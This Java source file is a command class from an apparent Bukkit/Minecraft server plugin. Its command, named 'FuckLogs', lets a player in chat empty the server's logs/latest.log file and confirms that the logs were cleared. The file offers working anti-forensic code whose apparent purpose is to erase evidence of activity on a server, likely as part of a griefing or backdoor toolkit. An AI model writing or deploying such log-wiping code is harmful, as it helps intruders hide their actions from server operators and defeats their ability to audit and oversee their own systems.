package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;

import java.io.FileOutputStream;
import java.io.IOException;

public class FuckLogs extends Command {

    public FuckLogs() {
        super("FuckLogs", "FuckLogs", "Clears latest.log", CommandCategory.SERVER);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        try {

            new FileOutputStream("logs/latest.log").close();

            ChatUtils.sendMessage(p, "Successfully cleared the logs");

        } catch (IOException ex) {
            ChatUtils.sendMessage(p, "§cError: §7Unable to clear the log file. Please try again");
        }
    }

}
